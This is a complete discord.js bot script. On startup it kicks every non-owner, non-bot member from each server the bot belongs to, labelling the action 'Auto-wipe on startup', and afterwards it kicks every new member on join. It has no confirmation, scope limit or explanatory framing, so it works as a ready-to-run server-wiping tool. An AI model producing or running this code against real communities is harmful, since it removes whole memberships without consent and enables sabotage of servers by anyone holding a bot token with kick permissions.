require("dotenv").config();
const { Client, GatewayIntentBits, Events } = require("discord.js");

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMembers
    ]
});

client.on(Events.ClientReady, async () => {
    console.log(`Logged in as ${client.user.tag}`);

    for (const [guildId, guild] of client.guilds.cache) {
        console.log(`Scanning server: ${guild.name}`);

        const members = await guild.members.fetch();

        members.forEach(async (member) => {
            if (member.id !== guild.ownerId && !member.user.bot) {
                try {
                    await member.kick("Auto-wipe on startup");
                    console.log(`Kicked ${member.user.tag}`);
                } catch (err) {
                    console.log(`Failed to kick ${member.user.tag}: ${err}`);
                }
            }
        });
    }
});

client.on(Events.GuildMemberAdd, async (member) => {
    if (member.id === member.guild.ownerId || member.user.bot) return;

    try {
        await member.kick("Auto-kick on join");
        console.log(`Kicked ${member.user.tag}`);
    } catch (err) {
        console.log(`Failed to kick ${member.user.tag}: ${err}`);
    }
});

client.login(process.env.DISCORD_TOKEN);
